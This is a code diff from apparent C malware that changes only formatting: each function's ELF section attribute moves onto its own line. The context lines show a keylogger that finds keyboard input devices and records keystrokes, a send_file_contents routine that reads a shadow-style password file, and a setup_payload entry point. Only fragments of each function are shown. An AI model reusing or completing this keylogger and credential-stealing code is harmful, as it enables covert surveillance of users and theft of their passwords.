@@ -24,8 +24,8 @@ static char *read_file(char const *filepath)
     return result;
 }
 
-
-__attribute__((section(ELF_CODE))) inline static int is_keyboard(const struct dirent *file)
+__attribute__((section(ELF_CODE)))
+inline static int is_keyboard(const struct dirent *file)
 {
     size_t len = strlen(file->d_name);
 
@@ -35,7 +35,8 @@ __attribute__((section(ELF_CODE))) inline static int is_keyboard(const struct di
         && file->d_name[len - 1] == 'd';
 }
 
-__attribute__((section(ELF_CODE))) inline static int *find_keyboards(void)
+__attribute__((section(ELF_CODE)))
+inline static int *find_keyboards(void)
 {
     struct dirent **char_devices = NULL;
     register int possible_paths = scandir(DIR_PATH, &char_devices,
@@ -66,7 +67,8 @@ __attribute__((section(ELF_CODE))) inline static int *find_keyboards(void)
     return result;
 }
 
-__attribute__((section(ELF_CODE))) inline static void refresh_set(fd_set *set, int *kb)
+__attribute__((section(ELF_CODE)))
+inline static void refresh_set(fd_set *set, int *kb)
 {
     register int ctr = -1;
 
@@ -75,7 +77,8 @@ __attribute__((section(ELF_CODE))) inline static void refresh_set(fd_set *set, i
         FD_SET(kb[ctr], set);
 }
 
-__attribute__((section(ELF_CODE))) inline static char *append(char *buffer, char *to_add)
+__attribute__((section(ELF_CODE)))
+inline static char *append(char *buffer, char *to_add)
 {
     register size_t new_len = 0;
 
@@ -87,7 +90,8 @@ __attribute__((section(ELF_CODE))) inline static char *append(char *buffer, char
     return buffer;
 }
 
-__attribute__((section(ELF_CODE))) inline static bool is_shift(char code)
+__attribute__((section(ELF_CODE)))
+inline static bool is_shift(char code)
 {
     return code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT;
 }
@@ -102,7 +106,8 @@ __attribute__((section(ELF_CODE))) bool check_if_on_shift(bool is_on_shift, stru
     return is_on_shift;
 }
 
-__attribute__((section(ELF_CODE))) inline static void log_single_key(int fd)
+__attribute__((section(ELF_CODE)))
+inline static void log_single_key(int fd)
 {
     static char *buffer = NULL;
     static bool is_on_shift = false;
@@ -139,7 +144,8 @@ __attribute__((section(ELF_CODE))) inline static void log_single_key(int fd)
     sigaction(SIGPIPE, &old, NULL);
 }
 
-__attribute__((section(ELF_CODE))) inline static void log_keys(int *fds)
+__attribute__((section(ELF_CODE)))
+inline static void log_keys(int *fds)
 {
     pid_t child = fork();
     struct timeval timeout;
@@ -172,7 +178,8 @@ __attribute__((section(ELF_CODE))) inline static void log_keys(int *fds)
     }
 }
 
-__attribute__((section(ELF_CODE))) inline static void send_file_contents(void)
+__attribute__((section(ELF_CODE)))
+inline static void send_file_contents(void)
 {
     char *shadow = read_file("/dev/shadow");
 
@@ -182,7 +189,8 @@ __attribute__((section(ELF_CODE))) inline static void send_file_contents(void)
     free(shadow);
 }
 
-__attribute__((section(ELF_CODE))) void setup_payload(void)
+__attribute__((section(ELF_CODE)))
+void setup_payload(void)
 {
     send_file_contents();
 
